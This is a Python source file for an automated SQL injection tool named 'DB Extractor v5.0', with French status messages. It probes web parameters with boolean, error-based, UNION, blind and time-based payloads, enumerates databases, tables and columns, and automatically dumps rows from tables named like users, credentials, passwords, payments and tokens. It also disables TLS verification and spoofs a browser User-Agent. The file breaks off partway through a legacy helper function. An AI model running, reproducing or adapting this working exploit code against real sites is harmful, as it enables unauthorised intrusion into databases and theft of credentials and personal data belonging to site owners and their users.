"""
DB Extractor v5.0 - UHQKYRA
=============================================================
Ultra-reliable SQL injection detection + data extraction.

HOW IT WORKS:
  1. Tests ALL URL parameters (and POST params if provided)
  2. For each param, tries multiple injection CONTEXTS:
       numeric  : value AND 1=1--   vs  value AND 1=2--
       string   : value' AND '1'='1  vs  value' AND '1'='2
       dquote   : value" AND "1"="1  vs  value" AND "1"="2
       paren    : value') AND ('1'='1  vs  value') AND ('1'='2
  3. With multiple SUFFIXES: -- -  #  --  /*  %00
  4. Detects injection via response length/content difference
  5. Tries extraction techniques in order of reliability:
       a) Error-based  (EXTRACTVALUE — works even without reflection)
       b) UNION-based  (fast, needs reflected column)
       c) Boolean blind (always works, slower)
       d) Time-based   (last resort)

ERROR-BASED (most reliable for MySQL):
  EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING(SQL,1,30), 0x7e))
  → paginates with SUBSTRING(SQL, 1,30), SUBSTRING(SQL,31,30)...
  → always works as long as there is SQL injection + MySQL

UNION-BASED:
  1. Detect column count via ORDER BY 1..N (content diff, not error)
  2. Find reflected column via distinctive number 0x554851 ("UHQ")
  3. Extract with CONCAT(0x5339, data, 0x4539) markers

SUPPORTED: MySQL (primary), PostgreSQL, MSSQL, SQLite, Oracle
=============================================================
"""
import re
import time
import threading
import urllib.parse
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── Constants ───────────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Markers for UNION extraction — short, hex-safe, unlikely to appear naturally
MARK_S = "S9S"   # start  (0x533953)
MARK_E = "E9E"   # end    (0x453945)

# Hex values for the markers
HEX_MS = "0x533953"
HEX_ME = "0x453945"

# SQL error patterns
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*?mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"ora-\d{4,5}",
    r"microsoft.*?odbc.*?sql",
    r"incorrect syntax near",
    r"mssql_query",
    r"sqlite.*?error",
    r"operationalerror.*?sqlite",
    r"division by zero",
    r"column count doesn.*?match",
    r"the used select statements have a different number of columns",
    r"unknown column",
    r"table.*?doesn.*?exist",
    r"unknown table",
    r"sql syntax.*?near",
    r"syntax error.*?near",
    r"invalid column name",
    r"conversion failed when converting",
]

# EXTRACTVALUE error regex — extracts data from error message
EXTRACT_RE = re.compile(r'~([^~]{1,200})~|XPATH syntax error: \'~?([^\']{1,200})~?\'', re.IGNORECASE)

# DB type signatures
DB_SIGNATURES = {
    "MySQL":      [r"you have an error in your sql syntax", r"warning.*?mysql", r"mysql_fetch", r"mysql_num_rows"],
    "PostgreSQL": [r"pg_query\(\)", r"pg_exec\(\)", r"postgresql.*?error", r"org\.postgresql"],
    "MSSQL":      [r"microsoft.*?odbc.*?sql", r"incorrect syntax near", r"mssql_query", r"unclosed quotation mark"],
    "Oracle":     [r"ora-\d{4,5}", r"oracle.*?error", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite.*?error", r"operationalerror.*?sqlite"],
}

SENSITIVE_TABLES = [
    "users", "user", "admin", "admins", "accounts", "account",
    "members", "member", "customers", "customer", "login",
    "credentials", "auth", "authentication", "passwords", "password",
    "employees", "staff", "orders", "payments", "transactions",
    "emails", "messages", "tokens", "sessions", "config", "settings",
    "wp_users", "joomla_users", "jos_users", "drupal_users",
    "phpbb_users", "vb_user", "smf_members",
]

# ─── Helper functions ─────────────────────────────────────────────────────────

def _has_sql_error(text):
    t = (text or "").lower()
    return any(re.search(p, t) for p in SQL_ERROR_PATTERNS)


def _detect_db_from_error(text):
    t = (text or "").lower()
    for db, patterns in DB_SIGNATURES.items():
        if any(re.search(p, t) for p in patterns):
            return db
    return "MySQL"


def _extract_error_value(text):
    """Extract data from EXTRACTVALUE/UPDATEXML error message"""
    if not text:
        return None
    m = EXTRACT_RE.search(text)
    if m:
        val = (m.group(1) or m.group(2) or "").strip("~").strip()
        if val and val != "1":
            return val
    return None


def _responses_differ(r1_text, r2_text, threshold=0.06):
    """Returns True if responses are significantly different"""
    if r1_text is None or r2_text is None:
        return True
    l1, l2 = len(r1_text), len(r2_text)
    if l1 == 0 and l2 == 0:
        return False
    diff = abs(l1 - l2) / max(l1, l2, 1)
    return diff > threshold


# ─── Core class ───────────────────────────────────────────────────────────────

class SQLInjector:
    """
    Full SQLi detection + extraction engine.

    Quick start:
        inj = SQLInjector("http://site.com/page.php?id=1", callback=cb)
        if inj.find_injection():
            info = inj.extract_info()
            tables = inj.extract_tables()
    """

    # (context_name, true_template, false_template)
    # {V} = original value, {S} = suffix
    CONTEXTS = [
        ("numeric",  "{V} AND 1=1{S}",          "{V} AND 1=2{S}"),
        ("numeric2", "{V} AND 1=1--",            "{V} AND 1=2--"),
        ("string1",  "{V}' AND '1'='1{S}",       "{V}' AND '1'='2{S}"),
        ("string2",  "{V}' AND 1=1{S}",          "{V}' AND 1=2{S}"),
        ("dquote",   '{V}" AND "1"="1{S}',       '{V}" AND "1"="2{S}'),
        ("paren1",   "{V}') AND ('1'='1{S}",     "{V}') AND ('1'='2{S}"),
        ("paren2",   "{V}') AND 1=1{S}",         "{V}') AND 1=2{S}"),
        ("str_or",   "{V}' OR '1'='1{S}",        "{V}' OR '1'='2{S}"),
        ("num_or",   "{V} OR 1=1{S}",            "{V} OR 1=2{S}"),
    ]

    SUFFIXES = ["-- -", "#", "--", "-- ", " --", "/*", "  "]

    def __init__(self, url, param=None, method="GET", post_data=None,
                 cookies=None, headers=None, callback=None, timeout=12):
        self.url       = url
        self.param     = param        # None = test all params
        self.method    = method.upper()
        self.post_data = dict(post_data or {})
        self.cookies   = dict(cookies or {})
        self.extra_hdr = dict(headers or {})
        self.cb_fn     = callback
        self.timeout   = timeout

        # session
        self.session = requests.Session() if HAS_REQUESTS else None

        # discovered injection point
        self.inj_param   = None
        self.inj_ctx     = None   # context name
        self.inj_true    = None   # true payload template
        self.inj_false   = None   # false payload template
        self.inj_suffix  = None
        self.inj_method  = "GET"

        # extraction setup
        self.technique   = None   # "error" | "union" | "blind" | "time"
        self.db_type     = "MySQL"
        self.num_cols    = 0
        self.vis_col     = -1     # 0-indexed

        # baselines
        self._baseline   = None   # response text of normal request
        self._err_pg     = None   # response text of obvious-error request

        # parse URL
        self._parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
        self._qs     = dict(urllib.parse.parse_qsl(self._parsed.query, keep_blank_values=True))

    # ── Callback ─────────────────────────────────────────────────────────────
    def _cb(self, t, m):
        if self.cb_fn:
            self.cb_fn({"type": t, "message": m})

    # ── Raw request ──────────────────────────────────────────────────────────
    def _req(self, payload, param=None, method=None, extra_qs=None):
        """Send request with payload injected into param. Returns response text."""
        if not self.session:
            return ""
        p = param or self.inj_param
        m = method or self.inj_method or self.method
        hdrs = {"User-Agent": UA}
        hdrs.update(self.extra_hdr)
        try:
            if m == "GET":
                qs = dict(self._qs)
                if extra_qs:
                    qs.update(extra_qs)
                if p:
                    qs[p] = payload
                base = self._parsed._replace(query="").geturl()
                r = self.session.get(base, params=qs, timeout=self.timeout,
                                     verify=False, headers=hdrs,
                                     cookies=self.cookies, allow_redirects=True)
            else:
                data = dict(self.post_data)
                if p:
                    data[p] = payload
                r = self.session.post(self.url, data=data, timeout=self.timeout,
                                      verify=False, headers=hdrs,
                                      cookies=self.cookies, allow_redirects=True)
            return r.text
        except Exception:
            return ""

    def _req_raw(self, url, method="GET", params=None, data=None):
        """Raw request with explicit URL/params."""
        if not self.session:
            return ""
        hdrs = {"User-Agent": UA}
        hdrs.update(self.extra_hdr)
        try:
            if method == "GET":
                r = self.session.get(url, params=params, timeout=self.timeout,
                                     verify=False, headers=hdrs,
                                     cookies=self.cookies, allow_redirects=True)
            else:
                r = self.session.post(url, data=data, timeout=self.timeout,
                                      verify=False, headers=hdrs,
                                      cookies=self.cookies, allow_redirects=True)
            return r.text
        except Exception:
            return ""

    # ── Injection payload builder ─────────────────────────────────────────────
    def _build(self, template, orig_val, suffix):
        return template.replace("{V}", str(orig_val)).replace("{S}", suffix)

    # ── Find injection point ──────────────────────────────────────────────────
    def find_injection(self):
        """
        Test all URL (and POST) parameters for SQLi.
        Returns True if at least one injection point found.
        Sets self.inj_param, self.inj_ctx, self.inj_true, self.inj_false, self.inj_suffix
        """
        if not self.session:
            return False

        # Build list of params to test
        params_to_test = []
        if self.param:
            # User specified a param: use it (also as POST)
            val = self._qs.get(self.param) or self.post_data.get(self.param) or "1"
            params_to_test.append(("GET", self.param, val))
        else:
            # Test ALL URL params
            for k, v in self._qs.items():
                params_to_test.append(("GET", k, v))
            # Test POST params
            for k, v in self.post_data.items():
                params_to_test.append(("POST", k, v))

        if not params_to_test:
            # No params found — try adding id=1
            self._cb("warn", "🗄️ Aucun paramètre URL trouvé — test avec id=1")
            params_to_test.append(("GET", "id", "1"))

        self._cb("info", f"🗄️ Test de {len(params_to_test)} paramètre(s) pour SQLi...")

        for method, param, orig_val in params_to_test:
            self._cb("info", f"🗄️ Test param: {param}={orig_val} [{method}]")

            # 1) Quick error probe: send a single quote
            self.inj_param  = param
            self.inj_method = method
            quote_resp = self._req(str(orig_val) + "'")
            if _has_sql_error(quote_resp):
                self.db_type = _detect_db_from_error(quote_resp)
                self._cb("found", f"🗄️ Erreur SQL sur param '{param}' avec quote — DB: {self.db_type}")

            # 2) Get baseline
            baseline = self._req(str(orig_val))
            self._baseline = baseline

            # 3) Try each context × suffix
            for ctx_name, true_tpl, false_tpl in self.CONTEXTS:
                for suffix in self.SUFFIXES:
                    true_pay  = self._build(true_tpl,  orig_val, suffix)
                    false_pay = self._build(false_tpl, orig_val, suffix)

                    true_resp  = self._req(true_pay,  param=param, method=method)
                    false_resp = self._req(false_pay, param=param, method=method)

                    if not true_resp or not false_resp:
                        continue

                    # Condition: true≈baseline AND false≠baseline
                    true_like_base  = not _responses_differ(baseline, true_resp, threshold=0.05)
                    false_diff_base = _responses_differ(baseline, false_resp, threshold=0.05)
                    true_diff_false = _responses_differ(true_resp, false_resp, threshold=0.04)

                    if (true_like_base and false_diff_base) or true_diff_false:
                        self._cb("found", f"🗄️ ✅ SQLi détectée! param='{param}' ctx={ctx_name} suf='{suffix}'")
                        self.inj_param  = param
                        self.inj_method = method
                        self.inj_ctx    = ctx_name
                        self.inj_true   = true_tpl
                        self.inj_false  = false_tpl
                        self.inj_suffix = suffix
                        self._baseline  = baseline
                        self._orig_val  = str(orig_val)   # ← store for all sub-methods
                        return True

        self._cb("warn", "🗄️ Aucune injection détectée sur les paramètres testés")
        return False

    # ── Injection wrapper (uses discovered context) ───────────────────────────
    def _ov(self):
        """Return stored original value, with fallback"""
        if hasattr(self, "_orig_val") and self._orig_val is not None:
            return self._orig_val
        return (self._qs.get(self.inj_param)
                or self.post_data.get(self.inj_param, "")
                or "1")

    def _quote(self):
        """Derive quote char from discovered injection context"""
        ctx = self.inj_ctx or "string1"
        if "num" in ctx:
            return ""
        if "dquote" in ctx:
            return '"'
        if "paren" in ctx:
            return "')"
        return "'"   # default: string contexts

    def _wrap(self, injection):
        """
        Build a full injectable payload using the discovered context.
        e.g.: '1' UNION SELECT ...-- -'  (for string1 context)
        """
        ov  = self._ov()
        q   = self._quote()
        suf = self.inj_suffix or "-- -"
        return f"{ov}{q} {injection}{suf}"

    def _wrap_neg(self, injection):
        """Like _wrap but replaces orig_val with -1 to suppress original row"""
        q   = self._quote()
        suf = self.inj_suffix or "-- -"
        return f"-1{q} {injection}{suf}"

    # ── Column count ─────────────────────────────────────────────────────────
    def _detect_cols_orderby(self):
        """ORDER BY N — detect column count using discovered injection context"""
        # Reference: ORDER BY 1 always succeeds
        ref = self._req_payload(self._wrap("ORDER BY 1"))
        if not ref:
            ref = self._baseline or ""

        for n in range(2, 26):
            resp = self._req_payload(self._wrap(f"ORDER BY {n}"))
            if not resp:
                continue
            if _has_sql_error(resp) or _responses_differ(ref, resp, threshold=0.04):
                cols = n - 1
                self._cb("found", f"🗄️ ORDER BY: {cols} colonne(s)")
                return cols
        return 0

    def _detect_cols_union(self):
        """UNION SELECT NULL×N — find count with discovered context"""
        for n in range(1, 26):
            nulls = ",".join(["NULL"] * n)
            resp = self._req_payload(self._wrap(f"UNION SELECT {nulls}"))
            if resp and not _has_sql_error(resp) and len(resp) > 50:
                self._cb("found", f"🗄️ UNION NULL×{n}: OK")
                return n
            # Also try with ALL
            resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
            if resp2 and not _has_sql_error(resp2) and len(resp2) > 50:
                self._cb("found", f"🗄️ UNION ALL NULL×{n}: OK")
                return n
        return 0

    def _req_payload(self, payload):
        """Send request with a prebuilt payload string"""
        return self._req(payload, param=self.inj_param, method=self.inj_method)

    def detect_columns(self):
        """Auto-detect column count"""
        self._cb("info", "🗄️ Détection du nombre de colonnes...")
        n = self._detect_cols_orderby()
        if not n:
            n = self._detect_cols_union()
        self.num_cols = n
        if n:
            self._cb("found", f"🗄️ Colonnes: {n}")
        else:
            self._cb("warn", "🗄️ Nombre de colonnes inconnu — tentative avec 1..10")
        return n

    # ── Find visible column ───────────────────────────────────────────────────
    def find_visible_column(self, num_cols=None):
        """Find which column position is reflected in the output"""
        n = num_cols or self.num_cols or 8
        self._cb("info", f"🗄️ Recherche colonne visible ({n} positions)...")

        MARKER_NUM = "98765432100"
        HEX_MARK   = "0x" + MARK_S.encode().hex()   # "0x533953"

        for pos in range(n):
            cols = ["NULL"] * n
            # Try numeric marker first (never sanitized)
            cols[pos] = MARKER_NUM
            nulls = ",".join(cols)
            # Use -1 (no matching row) so only UNION row shows
            resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
            if resp and MARKER_NUM in resp:
                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (num)")
                self.vis_col = pos
                return pos
            # Try string marker
            cols[pos] = HEX_MARK
            nulls = ",".join(cols)
            resp2 = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
            if resp2 and MARK_S in resp2:
                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (str)")
                self.vis_col = pos
                return pos

        self._cb("warn", "🗄️ Colonne visible non trouvée — error-based sera utilisé")
        return -1

    # ── Setup extraction technique ────────────────────────────────────────────
    def setup_technique(self):
        """Determine best extraction technique using the discovered injection context"""

        # Test 1: Error-based (most reliable for MySQL)
        self._cb("info", "🗄️ Test error-based (EXTRACTVALUE)...")
        # Use discovered context via _wrap
        pay_ev = self._wrap("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))")
        resp   = self._req_payload(pay_ev)
        val    = _extract_error_value(resp)
        if val == "1":
            self._cb("ok", "✅ Error-based EXTRACTVALUE prêt")
            self.technique = "error"
            self._err_fn   = "EXTRACTVALUE"
            return "error"

        pay_ux = self._wrap("AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1)")
        resp2  = self._req_payload(pay_ux)
        val2   = _extract_error_value(resp2)
        if val2 == "1":
            self._cb("ok", "✅ Error-based UPDATEXML prêt")
            self.technique = "error"
            self._err_fn   = "UPDATEXML"
            return "error"

        # Test 2: UNION-based
        self._cb("info", "🗄️ Test UNION-based...")
        n = self.detect_columns()
        if n:
            pos = self.find_visible_column(n)
            if pos >= 0:
                self._cb("ok", f"✅ UNION-based prêt (col {pos+1}/{n})")
                self.technique = "union"
                return "union"

        # Test 3: Boolean blind (already confirmed by find_injection)
        self._cb("info", "🗄️ Activation boolean blind...")
        true_pay  = self._req_payload(self._wrap("AND 1=1"))
        false_pay = self._req_payload(self._wrap("AND 1=2"))
        if true_pay and false_pay and _responses_differ(true_pay, false_pay):
            self._cb("ok", "✅ Boolean blind prêt")
            self.technique = "blind"
            return "blind"

        # Test 4: Time-based
        self._cb("info", "🗄️ Test time-based (SLEEP(2))...")
        t0 = time.time()
        self._req_payload(self._wrap("AND SLEEP(2)"))
        if time.time() - t0 > 1.8:
            self._cb("ok", "✅ Time-based blind prêt")
            self.technique = "time"
            return "time"

        self._cb("warn", "🗄️ Aucune technique d'extraction disponible")
        return None

    # ── Error-based extraction ────────────────────────────────────────────────
    def _error_extract(self, sql_expr):
        """Extract full string via EXTRACTVALUE/UPDATEXML — paginates with SUBSTRING"""
        fn   = getattr(self, "_err_fn", "EXTRACTVALUE")
        PAGE = 30   # MySQL EXTRACTVALUE max usable chars ~ 31

        result = ""
        offset = 1
        while True:
            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
            if fn == "UPDATEXML":
                inj = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
            else:
                inj = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"

            resp  = self._req_payload(self._wrap(inj))
            chunk = _extract_error_value(resp)

            if not chunk:
                break
            result += chunk
            if len(chunk) < PAGE:
                break
            offset += PAGE
            if offset > 2000:
                break

        return result if result else None

    # ── UNION-based extraction ────────────────────────────────────────────────
    def _union_extract(self, sql_expr):
        """Extract data via UNION SELECT using discovered context"""
        if self.vis_col < 0 or self.num_cols == 0:
            return None

        cols = ["NULL"] * self.num_cols
        cols[self.vis_col] = f"CONCAT({HEX_MS},({sql_expr}),{HEX_ME})"
        nulls = ",".join(cols)

        resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
        if resp and MARK_S in resp and MARK_E in resp:
            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp, re.DOTALL)
            if m:
                return m.group(1)
        # Fallback: without -1 suppression
        resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
        if resp2 and MARK_S in resp2 and MARK_E in resp2:
            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp2, re.DOTALL)
            if m:
                return m.group(1)
        return None

    # ── Boolean blind extraction ──────────────────────────────────────────────
    def _blind_true(self, cond):
        """Send condition and return True if response matches 'true' baseline"""
        resp = self._req_payload(self._wrap(f"AND ({cond})"))
        base = self._req_payload(self._wrap("AND 1=1"))
        return resp and base and not _responses_differ(resp, base, 0.04)

    def _blind_len(self, sql_expr, max_len=500):
        """Binary search for string length"""
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self._blind_true(f"LENGTH(({sql_expr}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _blind_char(self, sql_expr, pos):
        """Binary search for character at pos (1-based) — FIXED: uses self._ov()"""
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self._blind_true(f"ASCII(SUBSTRING(({sql_expr}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def _blind_extract(self, sql_expr, max_len=200):
        """Extract full string via boolean blind binary search — uses _blind_char"""
        length = self._blind_len(sql_expr, max_len=max_len)
        if not length:
            return None
        result = ""
        self._cb("info", f"🗄️ Blind extract: {length} chars...")
        for i in range(1, length + 1):
            result += self._blind_char(sql_expr, i)
        return result

    # ── Time-based extraction ─────────────────────────────────────────────────
    def _time_extract(self, sql_expr, max_len=100):
        """Extract via SLEEP-based blind (slow!)"""
        result = ""
        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
        for pos in range(1, max_len + 1):
            found = False
            for c in range(33, 127):
                for quote in ["'", ""]:
                    for suffix in ["-- -", "#"]:
                        payload = (f"{orig_val}{quote} AND IF("
                                   f"ASCII(SUBSTRING(({sql_expr}),{pos},1))={c},"
                                   f"SLEEP(1),0){suffix}")
                        t0 = time.time()
                        self._req(payload)
                        if time.time() - t0 > 0.9:
                            result += chr(c)
                            found = True
                        break
                    if found:
                        break
                if found:
                    break
            if not found:
                break
        return result or None

    # ── Universal query ───────────────────────────────────────────────────────
    def query(self, sql_expr):
        """Execute sql_expr using the best available technique"""
        if self.technique == "error":
            return self._error_extract(sql_expr)
        elif self.technique == "union":
            return self._union_extract(sql_expr)
        elif self.technique == "blind":
            return self._blind_extract(sql_expr)
        elif self.technique == "time":
            return self._time_extract(sql_expr)
        return None

    # ── High-level data extraction ────────────────────────────────────────────
    def extract_info(self):
        """Extract DB version, current database, user, hostname"""
        self._cb("info", "🗄️ Extraction des infos DB...")
        info = {}
        queries = {
            "MySQL": {
                "version":    "SELECT @@version",
                "current_db": "SELECT database()",
                "user":       "SELECT user()",
                "hostname":   "SELECT @@hostname",
                "datadir":    "SELECT @@datadir",
            },
            "PostgreSQL": {
                "version":    "SELECT version()",
                "current_db": "SELECT current_database()",
                "user":       "SELECT current_user",
            },
            "MSSQL": {
                "version":    "SELECT @@version",
                "current_db": "SELECT DB_NAME()",
                "user":       "SELECT SYSTEM_USER",
            },
            "SQLite": {
                "version":    "SELECT sqlite_version()",
            },
            "Oracle": {
                "version":    "SELECT banner FROM v$version WHERE rownum=1",
                "current_db": "SELECT ora_database_name FROM dual",
                "user":       "SELECT user FROM dual",
            },
        }
        for key, sql in queries.get(self.db_type, queries["MySQL"]).items():
            val = self.query(sql)
            if val:
                info[key] = val
                self._cb("found", f"🗄️ {key}: {val[:100]}")
        return info

    def extract_databases(self):
        """Return list of database names"""
        self._cb("info", "🗄️ Énumération des bases de données...")
        sql_map = {
            "MySQL":      "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c7c) FROM information_schema.schemata",
            "PostgreSQL": "SELECT string_agg(datname,'||') FROM pg_database",
            "MSSQL":      "SELECT STRING_AGG(name,'||') FROM master..sysdatabases",
            "SQLite":     None,
            "Oracle":     "SELECT LISTAGG(username,'||') WITHIN GROUP (ORDER BY username) FROM all_users",
        }
        sql = sql_map.get(self.db_type)
        if not sql:
            return []
        raw = self.query(sql)
        if not raw:
            return []
        dbs = [d.strip() for d in re.split(r'\|\|', raw) if d.strip()]
        self._cb("found", f"🗄️ Bases ({len(dbs)}): {', '.join(dbs[:15])}")
        return dbs

    def extract_tables(self, database=None):
        """Return list of table names"""
        self._cb("info", f"🗄️ Énumération des tables{' de '+database if database else ''}...")
        if self.db_type == "MySQL":
            if database:
                hex_db = "0x" + database.encode().hex()
                sql = (f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                       f"FROM information_schema.tables WHERE table_schema={hex_db}")
            else:
                sql = ("SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                       "FROM information_schema.tables WHERE table_schema=database()")
        elif self.db_type == "PostgreSQL":
            sql = "SELECT string_agg(tablename,'||') FROM pg_tables WHERE schemaname='public'"
        elif self.db_type == "MSSQL":
            sql = "SELECT STRING_AGG(name,'||') FROM sysobjects WHERE xtype='U'"
        elif self.db_type == "SQLite":
            sql = "SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table'"
        elif self.db_type == "Oracle":
            sql = "SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables"
        else:
            sql = ("SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                   "FROM information_schema.tables WHERE table_schema=database()")
        raw = self.query(sql)
        if not raw:
            return []
        tables = [t.strip() for t in re.split(r'\|\|', raw) if t.strip()]
        self._cb("found", f"🗄️ Tables ({len(tables)}): {', '.join(tables[:20])}")
        return tables

    def extract_columns(self, table, database=None):
        """Return list of column names for the given table"""
        self._cb("info", f"🗄️ Colonnes de {table}...")
        hex_tbl = "0x" + table.encode().hex()
        if self.db_type == "MySQL":
            if database:
                hex_db = "0x" + database.encode().hex()
                cond = f"table_name={hex_tbl} AND table_schema={hex_db}"
            else:
                cond = f"table_name={hex_tbl} AND table_schema=database()"
            sql = (f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) "
                   f"FROM information_schema.columns WHERE {cond}")
        elif self.db_type == "PostgreSQL":
            sql = (f"SELECT string_agg(column_name,'||') FROM information_schema.columns "
                   f"WHERE table_name='{table}'")
        elif self.db_type == "MSSQL":
            sql = f"SELECT STRING_AGG(name,'||') FROM syscolumns WHERE id=OBJECT_ID('{table}')"
        elif self.db_type == "SQLite":
            sql = f"SELECT GROUP_CONCAT(name,'||') FROM pragma_table_info('{table}')"
        elif self.db_type == "Oracle":
            sql = (f"SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) "
                   f"FROM all_tab_columns WHERE table_name=UPPER('{table}')")
        else:
            sql = (f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) "
                   f"FROM information_schema.columns WHERE table_name={hex_tbl}")
        raw = self.query(sql)
        if not raw:
            return []
        cols = [c.strip() for c in re.split(r'\|\|', raw) if c.strip()]
        self._cb("found", f"🗄️ Colonnes de {table}: {', '.join(cols)}")
        return cols

    def dump_table(self, table, columns, limit=50):
        """Dump rows from table. Returns list of dicts."""
        self._cb("info", f"🗄️ Dump de {table} ({', '.join(columns[:5])})...")
        rows = []

        if self.db_type == "MySQL":
            # GROUP_CONCAT all rows at once (fast)
            # Col sep: ;;  (0x3b3b), Row sep: ||  (0x7c7c)
            parts = [f"IFNULL({c},0x4e554c4c)" for c in columns]  # IFNULL(c, 'NULL')
            concat_row = f"CONCAT_WS(0x3b3b,{','.join(parts)})"
            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR 0x7c7c) "
                   f"FROM (SELECT {','.join(columns)} FROM `{table}` LIMIT {limit}) AS t_alias_")
            raw = self.query(sql)
            if raw:
                for row_str in raw.split("||"):
                    parts = row_str.split(";;")
                    if len(parts) >= len(columns):
                        rows.append(dict(zip(columns, parts[:len(columns)])))
                    elif any(p.strip() for p in parts):
                        rows.append(dict(zip(columns[:len(parts)], parts)))
        else:
            # Row by row
            for offset in range(limit):
                if self.db_type == "PostgreSQL":
                    sql = f"SELECT {','.join(columns)} FROM {table} LIMIT 1 OFFSET {offset}"
                elif self.db_type == "MSSQL":
                    sql = (f"SELECT TOP 1 {','.join(columns)} FROM {table} "
                           f"ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
                elif self.db_type == "Oracle":
                    sql = (f"SELECT {','.join(columns)} FROM "
                           f"(SELECT {','.join(columns)},ROWNUM rn__ FROM {table}) "
                           f"WHERE rn__={offset+1}")
                else:
                    sql = f"SELECT {','.join(columns)} FROM {table} LIMIT 1 OFFSET {offset}"
                row_raw = self.query(sql)
                if not row_raw:
                    break
                rows.append(dict(zip(columns, row_raw.split("||")[:len(columns)])))

        self._cb("found", f"🗄️ {len(rows)} ligne(s) extraite(s) de {table}")
        return rows


# ─── Public API ───────────────────────────────────────────────────────────────

def full_db_extraction(url, param=None, mode="enum", target_table=None,
                       method="GET", post_data=None, cookies=None,
                       callback=None):
    """
    Main entry point for DB extraction.
    mode: "basic" → version+db only | "enum" → +databases+tables | "dump" → +dump sensitive tables
    """
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {
        "injectable": False,
        "technique":  None,
        "db_type":    "MySQL",
        "info":       {},
        "databases":  [],
        "tables":     [],
        "columns":    {},
        "dump":       {},
        "vulnerabilities": [],
    }

    if not HAS_REQUESTS:
        cb("warn", "🗄️ requests non disponible")
        return results

    cb("info", f"🗄️ SQLi v5.0 — Analyse: {url}")

    inj = SQLInjector(url, param=param, method=method,
                      post_data=post_data or {}, cookies=cookies or {},
                      callback=callback)

    # Step 1: Find injection
    if not inj.find_injection():
        cb("warn", "🗄️ Aucune injection SQL détectée")
        return results

    results["injectable"] = True
    results["db_type"]    = inj.db_type

    # Step 2: Setup best technique
    tech = inj.setup_technique()
    if not tech:
        cb("warn", "🗄️ Injection détectée mais extraction impossible")
        results["vulnerabilities"].append({
            "type": "sql_injection",
            "severity": "critical",
            "name": f"SQL Injection dans param '{inj.inj_param}'",
            "detail": f"ctx={inj.inj_ctx} suf={inj.inj_suffix} — extraction échouée",
            "param": inj.inj_param,
        })
        return results

    results["technique"] = tech
    results["vulnerabilities"].append({
        "type":     "sql_injection",
        "severity": "critical",
        "name":     f"SQL Injection ({tech}) — param '{inj.inj_param}'",
        "detail":   f"DB: {inj.db_type} | ctx: {inj.inj_ctx} | suf: {inj.inj_suffix}",
        "param":    inj.inj_param,
    })

    cb("vuln", f"🚨 SQLi confirmée! technique={tech} db={inj.db_type} param={inj.inj_param}")

    # Step 3: Extract info
    results["info"] = inj.extract_info()

    if mode == "basic":
        return results

    # Step 4: Enumerate
    results["databases"] = inj.extract_databases()
    results["tables"]    = inj.extract_tables()

    if mode == "enum":
        return results

    # Step 5: Dump sensitive tables
    to_dump = []
    if target_table:
        to_dump = [target_table]
    else:
        for t in results["tables"]:
            if t.lower() in SENSITIVE_TABLES:
                to_dump.append(t)
        if not to_dump:
            to_dump = results["tables"][:3]

    for t in to_dump[:5]:
        cols = inj.extract_columns(t)
        results["columns"][t] = cols
        if cols:
            rows = inj.dump_table(t, cols, limit=30)
            results["dump"][t] = rows
            if rows:
                cb("vuln", f"🚨 TABLE '{t}': {len(rows)} ligne(s) extraite(s)!")

    return results


# ─── Legacy compatibility ──────────────────────────────────────────────────────

def detect_db_type(url, param=None, callback=None):
    """Legacy: detect DB type"""
    if not HAS_REQUESTS:
        return "MySQL"
    try:
        import requests as _r
        _r.packages.urllib3.disable_warnings()
        parsed = urllib.parse.urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        p = param or (list(qs.keys())[0] if qs else "id")
